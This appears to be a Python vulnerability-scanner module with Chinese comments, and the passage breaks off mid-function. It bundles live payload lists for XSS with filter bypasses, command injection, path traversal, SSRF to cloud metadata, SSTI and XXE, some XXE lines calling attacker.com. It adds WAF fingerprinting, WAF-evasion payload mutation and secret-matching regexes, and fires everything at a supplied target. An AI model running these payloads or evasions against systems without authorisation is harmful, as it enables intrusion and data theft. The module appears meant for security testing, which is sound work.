# -*- coding: utf-8 -*-
"""
增强漏洞检测模块

整合自优秀项目的漏洞检测精华:
- PentestGPT: Flag检测、漏洞验证链
- LuaN1aoAgent: 漏洞搜索、Exploit集成
- strix: 漏洞报告、CVSS评分
- CyberStrikeAI: 多类型漏洞检测

目标: 将检测率从80%提升到90%+
"""

import re
import json
import time
import hashlib
import logging
import urllib.request
import urllib.parse
import urllib.error
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed

logger = logging.getLogger(__name__)


class VulnSeverity(Enum):
    """漏洞严重程度"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class VulnType(Enum):
    """漏洞类型"""
    SQL_INJECTION = "sqli"
    XSS = "xss"
    RCE = "rce"
    LFI = "lfi"
    RFI = "rfi"
    SSRF = "ssrf"
    XXE = "xxe"
    SSTI = "ssti"
    CSRF = "csrf"
    IDOR = "idor"
    FILE_UPLOAD = "file_upload"
    DESERIALIZATION = "deserialization"
    AUTH_BYPASS = "auth_bypass"
    INFO_DISCLOSURE = "info_disclosure"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    OPEN_REDIRECT = "open_redirect"


@dataclass
class VulnerabilityEvidence:
    """漏洞证据"""
    request: str = ""
    response: str = ""
    payload: str = ""
    indicator: str = ""
    confidence: float = 0.0
    timestamp: str = ""


@dataclass
class DetectedVulnerability:
    """检测到的漏洞"""
    vuln_type: VulnType
    severity: VulnSeverity
    title: str
    description: str
    url: str
    parameter: str = ""
    evidence: List[VulnerabilityEvidence] = field(default_factory=list)
    cvss_score: float = 0.0
    cvss_vector: str = ""
    cve_id: Optional[str] = None
    cwe_id: Optional[str] = None
    remediation: str = ""
    verified: bool = False
    timestamp: str = ""


class VulnerabilityPatterns:
    """漏洞检测模式库 - 整合自多个优秀项目"""
    
    # ==================== SQL 注入检测模式 ====================
    SQL_ERROR_PATTERNS = {
        # MySQL
        "mysql": [
            r"SQL syntax.*?MySQL",
            r"Warning.*?mysql_",
            r"MySqlException",
            r"valid MySQL result",
            r"check the manual that corresponds to your MySQL server version",
        ],
        # PostgreSQL
        "postgresql": [
            r"PostgreSQL.*?ERROR",
            r"Warning.*?pg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"psycopg2\.",
        ],
        # Oracle
        "oracle": [
            r"ORA-\d{5}",
            r"Oracle.*?Driver",
            r"Warning.*?oci_",
            r"Oracle.*?Error",
        ],
        # SQL Server
        "mssql": [
            r"Driver.*?SQL[\s\-]*Server",
            r"SQL Server.*?Driver",
            r"Warning.*?mssql_",
            r"SQL Server.*?[0-9a-fA-F]{8}",
            r"SQL Server.*?syntax",
        ],
        # SQLite
        "sqlite": [
            r"SQLite.*?error",
            r"sqlite3\.OperationalError",
            r"SQLite3::SQLException",
        ],
        # 通用
        "generic": [
            r"SQL syntax.*?",
            r"syntax error",
            r"unexpected.*?SQL",
            r"Unclosed quotation mark",
            r"quoted string not properly terminated",
        ],
    }
    
    # SQL 注入成功标志
    SQL_SUCCESS_INDICATORS = [
        "root:x:0:0",  # /etc/passwd
        "admin:",
        "[sqlite_master]",
        "information_schema",
        "user_privileges",
        "password_hash",
    ]
    
    # ==================== XSS 检测模式 ====================
    XSS_PAYLOADS = {
        # 基础检测
        "basic": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
        ],
        # 绕过变体
        "bypass": [
            "<ScRiPt>alert('XSS')</sCrIpT>",
            "<img src=x onerror=\"alert('XSS')\">",
            "<svg/onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<object data=\"javascript:alert('XSS')\">",
            "<embed src=\"javascript:alert('XSS')\">",
            "<details open ontoggle=alert('XSS')>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert('XSS')>",
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert('XSS') )//",
        ],
        # 编码绕过
        "encoded": [
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",
        ],
    }
    
    # ==================== RCE 检测模式 ====================
    RCE_PAYLOADS = {
        # Linux
        "linux": [
            ";id",
            "|id",
            "$(id)",
            "`id`",
            ";cat /etc/passwd",
            "|cat /etc/passwd",
            "$(cat /etc/passwd)",
            "`cat /etc/passwd`",
            ";whoami",
            "|whoami",
        ],
        # Windows
        "windows": [
            "&whoami",
            "|whoami",
            "$(whoami)",
            "&type C:\\Windows\\win.ini",
            "|type C:\\Windows\\win.ini",
            "&net user",
            "|net user",
        ],
        # 成功标志
        "success_indicators": [
            "uid=",
            "gid=",
            "groups=",
            "root:",
            "[fonts]",
            "[extensions]",
            "Administrator",
            "NT AUTHORITY",
        ],
    }
    
    # ==================== 路径遍历检测模式 ====================
    PATH_TRAVERSAL_PAYLOADS = [
        # Linux
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",
        "..%252f..%252f..%252fetc/passwd",
        "/etc/passwd%00",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "....//....//....//....//etc/passwd",
        # Windows
        "....\\....\\....\\windows\\win.ini",
        "..\\..\\..\\windows\\win.ini",
        "..%5c..%5c..%5cwindows\\win.ini",
        "..%c1%9c..%c1%9c..%c1%9cwindows\\win.ini",
        # 编码绕过
        "....//....//....//etc/passwd%00.jpg",
        "..%2f..%2f..%2fetc%2fpasswd",
        "/var/log/../../../etc/passwd",
        # 特殊绕过
        "/..../..../..../etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    ]
    
    PATH_TRAVERSAL_INDICATORS = [
        "root:x:0:0:",
        "[fonts]",
        "[extensions]",
        "for 16-bit app support",
        "nobody:x:",
        "daemon:x:",
        "SSH",
        "MAIL",
    ]
    
    # ==================== SSRF 检测模式 ====================
    SSRF_PAYLOADS = {
        # 云元数据
        "cloud_metadata": [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/metadata/instance",
            "http://100.100.100.200/latest/meta-data/",
        ],
        # 内网探测
        "internal": [
            "http://127.0.0.1:22",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:11211",
            "http://127.0.0.1:27017",
            "http://localhost:22",
        ],
        # 成功标志
        "success_indicators": [
            "ami-id",
            "instance-id",
            "hostname",
            "local-ipv4",
            "SSH-2.0",
            "Redis",
            "Memcached",
        ],
    }
    
    # ==================== SSTI 检测模式 ====================
    SSTI_PAYLOADS = {
        "detection": [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{7*7}",
            "{{7*'7'}}",
        ],
        "jinja2": [
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{config.items()}}",
            "{{request.application.__globals__}}",
        ],
        "twig": [
            "{{_self.env.display('id')}}",
            "{{app.request.server.all|join(',')}}",
        ],
        "freemarker": [
            "${\"freemarker\".getClass()}", 
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        ],
    }
    
    # ==================== XXE 检测模式 ====================
    XXE_PAYLOADS = [
        # 文件读取
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
        # SSRF
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]><foo>&xxe;</foo>',
        # 参数实体
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]><foo></foo>',
        # 盲XXE
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/collect">%xxe;]><foo></foo>',
        # 外部DTD
        '<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker.com/evil.dtd"><foo></foo>',
    ]
    
    XXE_INDICATORS = [
        "root:x:0:0:",
        "[fonts]",
        "[extensions]",
        "ami-id",
        "instance-id",
        "ssh-rsa",
        "BEGIN RSA",
        "redis_version",
        "-ERR",
    ]
    
    # ==================== 反序列化检测模式 ====================
    DESER_INDICATORS = {
        "java": [
            "java.lang.Runtime",
            "java.lang.ProcessBuilder",
            "org.apache.commons.collections",
            "ysoserial",
        ],
        "php": [
            "O:4:\"Test\"",
            "O:8:\"stdClass\"",
            "__wakeup",
            "__destruct",
        ],
        "python": [
            "csubprocess",
            "Popen",
            "cos\nsystem",
        ],
    }
    
    # ==================== 敏感信息泄露检测模式 ====================
    SENSITIVE_PATTERNS = {
        "api_keys": [
            r"api[_-]?key['\"]?\s*[:=]\s*['\"][a-zA-Z0-9]{20,}['\"]",
            r"apikey['\"]?\s*[:=]\s*['\"][a-zA-Z0-9]{20,}['\"]",
            r"api[_-]?secret['\"]?\s*[:=]\s*['\"][a-zA-Z0-9]{20,}['\"]",
            r"x-api-key['\"]?\s*[:=]\s*['\"][a-zA-Z0-9]{20,}['\"]",
        ],
        "aws_keys": [
            r"AKIA[0-9A-Z]{16}",
            r"aws[_-]?access[_-]?key[_-]?id['\"]?\s*[:=]\s*['\"][A-Z0-9]{20}['\"]",
            r"aws[_-]?secret[_-]?access[_-]?key['\"]?\s*[:=]\s*['\"][a-zA-Z0-9/+=]{40}['\"]",
            r"ASIA[0-9A-Z]{16}",
        ],
        "passwords": [
            r"password['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]",
            r"passwd['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]",
            r"pwd['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]",
            r"DB_PASSWORD['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]",
            r"MYSQL_PASSWORD['\"]?\s*[:=]\s*['\"][^'\"]{8,}['\"]",
        ],
        "database": [
            r"mysql://[^:]+:[^@]+@[^/]+/[a-zA-Z0-9_]+",
            r"postgres://[^:]+:[^@]+@[^/]+/[a-zA-Z0-9_]+",
            r"mongodb://[^:]+:[^@]+@[^/]+/[a-zA-Z0-9_]+",
            r"mongodb\+srv://[^:]+:[^@]+@[^/]+",
            r"redis://[^:]+:[^@]+@[^/]+",
            r"jdbc:[a-z]+://[^:]+:[0-9]+/[a-zA-Z0-9_]+",
        ],
        "jwt": [
            r"eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*",
        ],
        "private_keys": [
            r"-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----",
            r"-----BEGIN PGP PRIVATE KEY BLOCK-----",
            r"-----BEGIN ENCRYPTED PRIVATE KEY-----",
        ],
        "oauth_tokens": [
            r"oauth[_-]?token['\"]?\s*[:=]\s*['\"][a-zA-Z0-9_-]{20,}['\"]",
            r"access[_-]?token['\"]?\s*[:=]\s*['\"][a-zA-Z0-9_-]{20,}['\"]",
            r"refresh[_-]?token['\"]?\s*[:=]\s*['\"][a-zA-Z0-9_-]{20,}['\"]",
        ],
        "slack_tokens": [
            r"xox[baprs]-[0-9]{10,}-[0-9]{10,}-[a-zA-Z0-9]{20,}",
            r"xox[baprs]-[0-9]+-[0-9]+-[a-zA-Z0-9]+",
        ],
        "github_tokens": [
            r"ghp_[a-zA-Z0-9]{36}",
            r"github[_-]?token['\"]?\s*[:=]\s*['\"][a-zA-Z0-9]{35,}['\"]",
        ],
        "google_api_keys": [
            r"AIza[0-9A-Za-z\-_]{35}",
            r"google[_-]?api[_-]?key['\"]?\s*[:=]\s*['\"][a-zA-Z0-9_-]{35,}['\"]",
        ],
        "sendgrid_keys": [
            r"SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}",
        ],
        "stripe_keys": [
            r"sk_live_[0-9a-zA-Z]{24}",
            r"sk_test_[0-9a-zA-Z]{24}",
            r"rk_live_[0-9a-zA-Z]{24}",
        ],
    }


class WAFDetector:
    """WAF检测器 - 整合自NeuroSploit"""
    
    WAF_FINGERPRINTS = {
        "cloudflare": {
            "headers": ["cf-ray", "cf-request-id", "cf-cache-status"],
            "body": ["cloudflare", "cf-browser-verification", "cf-error-details"],
            "block_codes": [403, 503],
        },
        "aws_waf": {
            "headers": ["x-amzn-requestid", "x-amz-cf-id"],
            "body": ["request id", "blocked by"],
            "block_codes": [403, 502],
        },
        "modsecurity": {
            "headers": [],
            "body": ["mod_security", "modsecurity", "not acceptable", "an error occurred"],
            "block_codes": [403, 406, 500],
        },
        "imperva": {
            "headers": ["x-iinfo", "x-cdn", "x-cdn-forward"],
            "body": ["incapsula", "imperva", "incident id"],
            "block_codes": [403, 503],
        },
        "akamai": {
            "headers": ["x-akamai-session-info", "x-akamai-transformed", "server: akamaighost"],
            "body": ["access denied", "akamai"],
            "block_codes": [403, 503],
        },
        "f5_bigip": {
            "headers": ["x-waf-status", "bigip", "f5"],
            "body": ["the requested url was rejected", "support id"],
            "block_codes": [403, 503],
        },
        "sucuri": {
            "headers": ["x-sucuri-id", "x-sucuri-cache", "server: sucuri"],
            "body": ["sucuri", "access denied"],
            "block_codes": [403, 503],
        },
        "barracuda": {
            "headers": ["barracuda"],
            "body": ["barracuda", "barracuda networks"],
            "block_codes": [403, 503],
        },
    }
    
    @classmethod
    def detect(cls, url: str, response_headers: dict, response_body: str, 
               block_code: int = None) -> Dict[str, Any]:
        """检测WAF"""
        detected = []
        
        for waf_name, fingerprint in cls.WAF_FINGERPRINTS.items():
            confidence = 0.0
            
            # 检查headers
            for header in fingerprint.get("headers", []):
                if header.lower() in [h.lower() for h in response_headers.keys()]:
                    confidence += 0.5
                for h, v in response_headers.items():
                    if header.lower() in h.lower() or header.lower() in str(v).lower():
                        confidence += 0.3
            
            # 检查body
            body_lower = response_body.lower()
            for pattern in fingerprint.get("body", []):
                if pattern.lower() in body_lower:
                    confidence += 0.4
            
            # 检查block codes
            if block_code and block_code in fingerprint.get("block_codes", []):
                confidence += 0.3
            
            if confidence >= 0.3:
                detected.append({
                    "name": waf_name,
                    "confidence": min(confidence, 1.0),
                    "block_codes": fingerprint.get("block_codes", [])
                })
        
        return {
            "has_waf": len(detected) > 0,
            "detected_wafs": detected,
            "primary_waf": detected[0] if detected else None
        }


class PayloadMutator:
    """Payload变异器 - 整合自NeuroSploit"""
    
    @staticmethod
    def case_variation(payload: str) -> str:
        """大小写混淆"""
        result = ""
        for i, c in enumerate(payload):
            if c.isalpha():
                result += c.upper() if i % 2 else c.lower()
            else:
                result += c
        return result
    
    @staticmethod
    def unicode_escape(payload: str) -> str:
        """Unicode编码"""
        return payload.replace("<", "\\u003c").replace(">", "\\u003e").replace("'", "\\u0027")
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """双重URL编码"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def html_entity_encode(payload: str) -> str:
        """HTML实体编码"""
        result = ""
        for c in payload:
            result += f"&#{ord(c)};"
        return result
    
    @staticmethod
    def inline_comment(payload: str) -> str:
        """SQL内联注释"""
        keywords = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "ORDER", "GROUP"]
        result = payload.upper()
        for kw in keywords:
            if kw in result:
                result = result.replace(kw, f"{kw[0]}/**/{kw[1:]}")
        return result
    
    @staticmethod
    def whitespace_variant(payload: str) -> str:
        """空白变体"""
        variants = ["%09", "%0a", "%0b", "%0c", "%0d", "%a0", "/**/"]
        result = payload.replace(" ", variants[hash(payload) % len(variants)])
        return result
    
    @staticmethod
    def generate_variants(payload: str, vuln_type: str = "xss", max_variants: int = 10) -> List[str]:
        """生成所有变体"""
        mutators = [
            PayloadMutator.case_variation,
            PayloadMutator.unicode_escape,
            PayloadMutator.double_url_encode,
        ]
        
        if vuln_type == "sqli":
            mutators.extend([
                PayloadMutator.inline_comment,
                PayloadMutator.whitespace_variant,
            ])
        elif vuln_type == "xss":
            mutators.append(PayloadMutator.html_entity_encode)
        
        variants = [payload]
        for mutator in mutators:
            try:
                variant = mutator(payload)
                if variant != payload and variant not in variants:
                    variants.append(variant)
            except Exception as e:
                logger.debug(f"Error generating payload variant: {e}")
        
        return variants[:max_variants]


class EnhancedVulnerabilityDetector:
    """增强漏洞检测器 - 核心检测引擎"""
    
    def __init__(self, timeout: int = 10, max_threads: int = 5):
        self.timeout = timeout
        self.max_threads = max_threads
        self.patterns = VulnerabilityPatterns()
        self.results: List[DetectedVulnerability] = []
        self.waf_info: Dict[str, Any] = {}
    
    def detect(self, target: str, vuln_types: List[str] = None) -> List[DetectedVulnerability]:
        """
        综合漏洞检测
        
        Args:
            target: 目标URL
            vuln_types: 要检测的漏洞类型列表，None表示全部
            
        Returns:
            检测到的漏洞列表
        """
        self.results = []
        
        # 首先检测WAF
        self.waf_info = self._detect_waf(target)
        
        # 定义检测函数
        detection_funcs = {
            "sqli": self._detect_sqli,
            "xss": self._detect_xss,
            "rce": self._detect_rce,
            "lfi": self._detect_lfi,
            "ssrf": self._detect_ssrf,
            "ssti": self._detect_ssti,
            "xxe": self._detect_xxe,
            "sensitive": self._detect_sensitive_info,
        }
        
        # 如果指定了漏洞类型，只检测指定的
        if vuln_types:
            detection_funcs = {k: v for k, v in detection_funcs.items() if k in vuln_types}
        
        # 并行检测
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = {
                executor.submit(func, target): vuln_type 
                for vuln_type, func in detection_funcs.items()
            }
            
            for future in as_completed(futures):
                try:
                    vulns = future.result()
                    if vulns:
                        self.results.extend(vulns)
                except Exception as e:
                    logger.error(f"检测错误: {e}")
        
        return self.results
    
    def _detect_waf(self, target: str) -> Dict[str, Any]:
        """检测WAF"""
        try:
            req = urllib.request.Request(target)
            response = urllib.request.urlopen(req, timeout=self.timeout)
            headers = dict(response.headers)
            body = response.read().decode('utf-8', errors='ignore')
            
            waf_info = WAFDetector.detect(target, headers, body)
            
            # 发送恶意请求测试
            test_payloads = [
                ("?id=1' OR '1'='1", "SQL injection"),
                ("?q=<script>alert(1)</script>", "XSS"),
            ]
            
            for payload, desc in test_payloads:
                try:
                    test_url = target + payload
                    req = urllib.request.Request(test_url)
                    urllib.request.urlopen(req, timeout=self.timeout)
                except urllib.error.HTTPError as e:
                    if e.code in [403, 406, 503]:
                        waf_info["blocking"] = True
                        waf_info["block_code"] = e.code
                        break
            
            return waf_info
        except Exception as e:
            return {"has_waf": False, "error": str(e)}
    
    def _detect_sqli(self, target: str) -> List[DetectedVulnerability]:
        """SQL注入检测 - 多轮验证"""
        vulns = []
        
        # 第一轮：错误检测
        error_payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "1'",
            "1\"",
            "' AND '1'='1",
            "' AND '1'='2",
        ]
        
        detected_errors = []
        
        for payload in error_payloads:
            try:
                test_url = f"{target}?id={urllib.parse.quote(payload)}"
                req = urllib.request.Request(test_url)
                response = urllib.request.urlopen(req, timeout=self.timeout)
                content = response.read().decode('utf-8', errors='ignore')
                
                # 检测SQL错误
                for db_type, patterns in self.patterns.SQL_ERROR_PATTERNS.items():
                    for pattern in patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            detected_errors.append({
                                "db_type": db_type,
                                "pattern": pattern,
                                "payload": payload,
                            })
                            break
            except urllib.error.HTTPError as e:
                if e.code == 500:
                    # 500错误可能表示SQL错误
                    try:
                        content = e.read().decode('utf-8', errors='ignore')
                        for db_type, patterns in self.patterns.SQL_ERROR_PATTERNS.items():
                            for pattern in patterns:
                                if re.search(pattern, content, re.IGNORECASE):
                                    detected_errors.append({
                                        "db_type": db_type,
                                        "pattern": pattern,
                                        "payload": payload,
                                        "code": 500,
                                    })
                                    break
                    except Exception as e:
                        logger.debug(f"Error reading SQL error response: {e}")
            except Exception as e:
                logger.debug(f"Error in SQL error detection: {e}")
        
        if detected_errors:
            # 第二轮：时间盲注验证
            time_payloads = [
                "' AND SLEEP(3)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "'; WAITFOR DELAY '0:0:3'--",
            ]
            
            time_based = False
            for payload in time_payloads:
                try:
                    test_url = f"{target}?id={urllib.parse.quote(payload)}"
                    start = time.time()
                    req = urllib.request.Request(test_url)
                    urllib.request.urlopen(req, timeout=self.timeout + 5)
                    elapsed = time.time() - start
                    
                    if elapsed >= 3:
                        time_based = True
                        break
                except Exception as e:
                    logger.debug(f"Error in time-based SQL injection test: {e}")
            
            # 创建漏洞对象
            vuln = DetectedVulnerability(
                vuln_type=VulnType.SQL_INJECTION,
                severity=VulnSeverity.CRITICAL if time_based else VulnSeverity.HIGH,
                title="SQL Injection",
                description=f"检测到SQL注入漏洞，数据库类型: {detected_errors[0]['db_type']}",
                url=target,
                parameter="id",
                cvss_score=9.8 if time_based else 8.6,
                remediation="使用参数化查询，禁止拼接SQL语句",
                verified=time_based,
            )
            
            # 添加证据
            for err in detected_errors[:3]:
                vuln.evidence.append(VulnerabilityEvidence(
                    payload=err["payload"],
                    indicator=err["pattern"],
                    confidence=0.8 if not time_based else 0.95,
                ))
            
            vulns.append(vuln)
        
        return vulns
    
    def _detect_xss(self, target: str) -> List[DetectedVulnerability]:
        """XSS检测"""
        vulns = []
        
        for category, payloads in self.patterns.XSS_PAYLOADS.items():
            for payload in payloads:
                try:
                    # 生成变体
                    variants = PayloadMutator.generate_variants(payload, "xss", 5)
                    
                    for variant in variants:
                        test_url = f"{target}?q={urllib.parse.quote(variant)}"
                        req = urllib.request.Request(test_url)
                        response = urllib.request.urlopen(req, timeout=self.timeout)
                        content = response.read().decode('utf-8', errors='ignore')
                        
                        # 检测payload是否被反射
                        if variant in content or payload in content:
                            # 进一步验证
                            if "<script>" in content.lower() or "alert(" in content.lower():
                                vuln = DetectedVulnerability(
                                    vuln_type=VulnType.XSS,
                                    severity=VulnSeverity.HIGH,
                                    title="Reflected XSS",
                                    description="检测到反射型XSS漏洞",
                                    url=target,
                                    parameter="q",
                                    cvss_score=7.3,
                                    remediation="对所有用户输入进行HTML编码",
                                )
                                vuln.evidence.append(VulnerabilityEvidence(
                                    payload=variant,
                                    indicator="Payload reflected without encoding",
                                    confidence=0.9,
                                ))
                                vulns.append(vuln)
                                return vulns  # 找到一个即可返回
                                
                except Exception as e:
                    logger.debug(f"Error in XSS detection: {e}")
        
        return vulns
    
    def _detect_rce(self, target: str) -> List[DetectedVulnerability]:
        """RCE检测"""
        vulns = []
        
        # Linux payloads
        for payload in self.patterns.RCE_PAYLOADS["linux"]:
            try:
                test_url = f"{target}?cmd={urllib.parse.quote(payload)}"
                req = urllib.request.Request(test_url)
                response = urllib.request.urlopen(req, timeout=self.timeout)
                content = response.read().decode('utf-8', errors='ignore')
                
                for indicator in self.patterns.RCE_PAYLOADS["success_indicators"]:
                    if indicator in content:
                        vuln = DetectedVulnerability(
                            vuln_type=VulnType.RCE,
                            severity=VulnSeverity.CRITICAL,
                            title="Remote Code Execution",
                            description="检测到远程代码执行漏洞",
                            url=target,
                            parameter="cmd",
                            cvss_score=10.0,
                            remediation="禁止用户输入传递给系统命令执行函数",
                            verified=True,
                        )
                        vuln.evidence.append(VulnerabilityEvidence(
                            payload=payload,
                            indicator=indicator,
                            confidence=0.95,
                        ))
                        vulns.append(vuln)
                        return vulns
                        
            except Exception as e:
                logger.debug(f"Error in RCE detection: {e}")
        
        return vulns
    
    def _detect_lfi(self, target: str) -> List[DetectedVulnerability]:
        """本地文件包含检测"""
        vulns = []
        
        for payload in self.patterns.PATH_TRAVERSAL_PAYLOADS:
            try:
                test_url = f"{target}?file={urllib.parse.quote(payload)}"
                req = urllib.request.Request(test_url)
                response = urllib.request.urlopen(req, timeout=self.timeout)
                content = response.read().decode('utf-8', errors='ignore')
                
                for indicator in self.patterns.PATH_TRAVERSAL_INDICATORS:
                    if indicator in content:
                        vuln = DetectedVulnerability(
                            vuln_type=VulnType.LFI,
                            severity=VulnSeverity.HIGH,
                            title="Local File Inclusion",
                            description="检测到本地文件包含漏洞",
                            url=target,
                            parameter="file",
                            cvss_score=7.5,
                            remediation="验证用户输入，限制文件路径",
                        )
                        vuln.evidence.append(VulnerabilityEvidence(
                            payload=payload,
                            indicator=indicator,
                            confidence=0.85,
                        ))
                        vulns.append(vuln)
                        return vulns
                        
            except Exception as e:
                logger.debug(f"Error in LFI detection: {e}")
        
        return vulns
    
    def _detect_ssrf(self, target: str) -> List[DetectedVulnerability]:
        """SSRF检测"""
        vulns = []
        
        # 云元数据测试
        for endpoint in self.patterns.SSRF_PAYLOADS["cloud_metadata"]:
            try:
                test_url = f"{target}?url={urllib.parse.quote(endpoint)}"
                req = urllib.request.Request(test_url)
                response = urllib.request.urlopen(req, timeout=self.timeout)
                content = response.read().decode('utf-8', errors='ignore')
                
                for indicator in self.patterns.SSRF_PAYLOADS["success_indicators"]:
                    if indicator in content:
                        vuln = DetectedVulnerability(
                            vuln_type=VulnType.SSRF,
                            severity=VulnSeverity.HIGH,
                            title="Server-Side Request Forgery",
                            description="检测到SSRF漏洞，可访问云服务元数据",
                            url=target,
                            parameter="url",
                            cvss_score=8.6,
                            remediation="验证URL白名单，禁止访问内网地址",
                        )
                        vuln.evidence.append(VulnerabilityEvidence(
                            payload=endpoint,
                            indicator=indicator,
                            confidence=0.9,
                        ))
                        vulns.append(vuln)
                        return vulns
                        
            except Exception as e:
                logger.debug(f"Error in SSRF detection: {e}")
        
        return vulns
    
    def _detect_ssti(self, target: str) -> List[DetectedVulnerability]:
        """SSTI模板注入检测"""
        vulns = []
        
        # 数学运算检测
        for payload in self.patterns.SSTI_PAYLOADS["detection"]:
            try:
                test_url = f"{target}?name={urllib.parse.quote(payload)}"
                req = urllib.request.Request(test_url)
                response = urllib.request.urlopen(req, timeout=self.timeout)
                content = response.read().decode('utf-8', errors='ignore')
                
                # 检测计算结果
                if "49" in content:
                    # 进一步确认模板引擎
                    engine = None
                    
                    if "{{7*'7'}}" in payload and "7777777" in content:
                        engine = "Jinja2"
                    elif "${" in payload:
                        engine = "Freemarker"
                    elif "#{" in payload:
                        engine = "Ruby ERB"
                    else:
                        engine = "Unknown"
                    
                    vuln = DetectedVulnerability(
                        vuln_type=VulnType.SSTI,
                        severity=VulnSeverity.CRITICAL,
                        title="Server-Side Template Injection",
                        description=f"检测到SSTI漏洞，模板引擎: {engine}",
                        url=target,
                        parameter="name",
                        cvss_score=9.8,
                        remediation="避免将用户输入直接传递给模板引擎",
                    )
                    vuln.evidence.append(VulnerabilityEvidence(
                        payload=payload,
                        indicator=f"49 found in response, engine: {engine}",
                        confidence=0.85,
                    ))
                    vulns.append(vuln)
                    return vulns
                    
            except Exception as e:
                logger.debug(f"Error in SSTI detection: {e}")
        
        return vulns
    
    def _detect_xxe(self, target: str) -> List[DetectedVulnerability]:
        """XXE检测"""
        vulns = []
        
        for payload in self.patterns.XXE_PAYLOADS:
            try:
                req = urllib.request.Request(target, data=payload.encode(), method='POST')
                req.add_header('Content-Type', 'application/xml')
                response = urllib.request.urlopen(req, timeout=self.timeout)
                content = response.read().decode('utf-8', errors='ignore')
                
                for indicator in self.patterns.XXE_INDICATORS:
                    if indicator in content:
                        vuln = DetectedVulnerability(
                            vuln_type=VulnType.XXE,
                            severity=VulnSeverity.HIGH,
                            title="XML External Entity Injection",
                            description="检测到XXE漏洞",
                            url=target,
                            cvss_score=8.6,
                            remediation="禁用XML外部实体处理",
                        )
                        vuln.evidence.append(VulnerabilityEvidence(
                            payload=payload[:100] + "...",
                            indicator=indicator,
                            confidence=0.9,
                        ))
                        vulns.append(vuln)
                        return vulns
                        
            except Exception as e:
                logger.debug(f"Error in XXE detection: {e}")
        
        return vulns
    
    def _detect_sensitive_info(self, target: str) -> List[DetectedVulnerability]:
        """敏感信息泄露检测"""
        vulns = []
        
        try:
            req = urllib.request.Request(target)
            response = urllib.request.urlopen(req, timeout=self.timeout)
            content = response.read().decode('utf-8', errors='ignore')
            
            for category, patterns in self.patterns.SENSITIVE_PATTERNS.items():
                for pattern in patterns:
                    matches = re.finditer(pattern, content, re.IGNORECASE)
                    for match in matches:
                        vuln = DetectedVulnerability(
                            vuln_type=VulnType.INFO_DISCLOSURE,
                            severity=VulnSeverity.MEDIUM,
                            title="Sensitive Information Disclosure",
                            description=f"检测到敏感信息泄露: {category}",
                            url=target,
                            cvss_score=5.3,
                            remediation="移除敏感信息，使用环境变量存储密钥",
                        )
                        vuln.evidence.append(VulnerabilityEvidence(
                            indicator=match.group(0)[:50] + "...",
                            confidence=0.7,
                        ))
                        vulns.append(vuln)
                        
        except Exception as e:
            logger.debug(f"Error in sensitive info detection: {e}")
        
        return vulns
    
    def generate_report(self) -> Dict[str, Any]:
        """生成检测报告"""
        return {
            "total_vulnerabilities": len(self.results),
            "waf_info": self.waf_info,
            "vulnerabilities": [
                {
                    "type": v.vuln_type.value,
                    "severity": v.severity.value,
                    "title": v.title,
                    "description": v.description,
                    "url": v.url,
                    "parameter": v.parameter,
